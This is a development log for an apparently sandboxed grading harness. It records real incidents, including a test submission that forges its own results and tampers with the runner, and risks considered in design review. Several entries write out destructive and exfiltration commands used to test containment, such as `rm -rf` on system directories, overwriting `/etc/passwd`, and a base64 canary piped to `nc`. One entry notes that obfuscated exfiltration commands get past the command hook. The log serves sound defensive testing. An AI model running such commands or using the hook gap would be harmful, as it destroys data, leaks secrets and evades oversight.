# Development log: failures observed and risks designed against

This file feeds the post-mortem. It has two sections that must not be confused:
things that **actually went wrong while building** (each one observed in a real run), and
**risks identified in design review** that shaped the code but were never observed as incidents.

## A. Observed failures (real incidents, in order)

A1. **Forged results (score 150/100).** The first fixture probe read `results_visible.json`
   AFTER the hidden suite had run. The `tamper_results` submission overwrites that file at
   import time, so the naive reader reported 8/8 visible passes and a score of 150.
   Fix: results are captured into harness memory immediately after each suite's parent
   process exits; step 8 re-reads the files only to *detect* tampering (an integrity flag),
   never to take the score from them.

## B. Risks identified in design review (not observed as incidents)

2. **Writable system mount.** If a nested mount (for example `/usr/local` on its own
   filesystem) stayed writable, a destructive command in the guest could reach host files.
   Mitigation built in from the start: every nested mount is remounted read-only and then
   *verified* read-only by an attempted write before the guest runs; a writable system mount
   makes the command refuse to run.
3. **Root in the guest undoing read-only mounts.** A process holding CAP_SYS_ADMIN can
   `mount -o remount,rw`. Mitigation: all capabilities dropped (`setpriv --bounding-set -all`)
   plus `no_new_privs`; the containment test asserts EPERM and zero capability sets.
4. **Resume grading a damaged guest.** If step 7 is retried on a workspace that lost
   `solution.py`, every test would "fail" and the run would report a plausible low score instead
   of an error. Mitigation: step 7 verifies the SHA-256 of `solution.py` before grading.
   (The failure-policy experiment measures whether this check fires; see the eval report.)
5. **The hook flagging the harness itself.** Inline `python3 -c "import socket ..."` would be
   blocked by the network rule. Mitigation: the network probe ships as a file written through
   the audited write path.

New real incidents found while running the tests are appended to section A below.

### A (continued)

A2. **Rollback restored a snapshot into the wrong guest (crash).** The first pipeline created a
   new sandbox for every recovery attempt, then called `restore("pre-step6")` on it. The snapshot
   belonged to the previous guest, which had already been deleted, so the CLI died with
   `SandboxError: snapshot pre-step6 not found`. Found by the policy x fault smoke matrix
   (`rollback/transient`, `rollback/corrupt`). Fix: resume and rollback now recover *inside the
   same guest*; only `fresh` creates a new one.

A3. **A hostile submission crashed its own grading run.** `tamper_results` appends to `runner.py`
   while the visible suite runs. The step-7 precondition compared the runner's hash, failed, and
   the harness treated the *student's tampering* as an infrastructure fault and triggered recovery.
   Fix: the grader is re-staged from the host copy before every suite; tampering is recorded as
   a finding (`tamper_detected`) instead of being treated as a fault; the step-7 precondition now
   verifies only the student's file.

A4. **The command hook was too thin.** With the hook ON only 2 of 7 destructive commands were
   blocked (`rm -rf /usr /bin /lib /etc`, `dd of=/usr/...`, `> /etc/passwd` all passed). The
   sandbox held anyway, which is the point of the design, but the hook was widened
   (`system_path_destruction` rule) and now blocks 6 of 7. The 3 obfuscated exfiltration commands
   still bypass it: that is expected and is reported as such.

A5. **A control attack that never ran.** `echo $CANARY | base64 | nc ...` returned exit 127: the
   guest image has no working `nc` (`/usr/bin/nc` points into `/etc/alternatives`, which the jail's
   private `/etc` does not contain). The "no defence" control therefore leaks 8 of 9, not 9 of 9.
   The report marks that attack as inert instead of counting it as a defence success.

A6. **Ctrl-C was silently ignored (found by the lifecycle check, not by me).** The generator
   reported `cleanup_on_interrupt: false`. The interrupt probe sent SIGINT to a job and got exit
   code 0 after the full 30 s hold: the job had ignored the signal. Cause: the job inherited
   SIGINT as *ignored* from a background shell launch, and Python does not install its default
   KeyboardInterrupt handler when SIGINT starts out ignored. The guest was still deleted (the job
   simply finished), so no orphan, but "Ctrl-C stops the run" was false. Fix: SIGINT is now
   installed explicitly in `install_signal_handlers`. The report boolean is computed from the
   observation (exit code 130 AND guest gone AND no stray process), so it could not be faked.

A7. **A refactor broke the harness's public API (caught by the test suite).** A later rewrite pass
   replaced `agent/pipeline.py` and `agent/cli.py` and added a parallel experiments module without
   first reading the code that already depended on them. The new pipeline exposed a `run_job()`
   function instead of the `Job` / `JobConfig` classes, so `agent/factory.py`, `app/jobs.py`, five
   experiment scripts and the pipeline tests all failed at import, and the reports on disk no longer
   corresponded to any code that existed. Detection: pytest collection errors
   (`ImportError: cannot import name 'Job'`). Fix: `Job` / `JobConfig` were rebuilt to the original
   contract, the duplicate modules were deleted, and **every report was regenerated from the current
   code** so no number in `reports/` predates the code that produced it. Reconciling also exposed two
   latent bugs the existing tests had been guarding against: a sandbox name with a trailing newline
   (`sbx-abcdef12\n`) was accepted because `$` matches before a final newline (now `fullmatch`), and an
   SDK-raised `CommandBlockedError` was wrapped into `SandboxError` because it was recognised by class
   *name* (now `isinstance`). Lesson: the tests are the contract; read before rewriting.
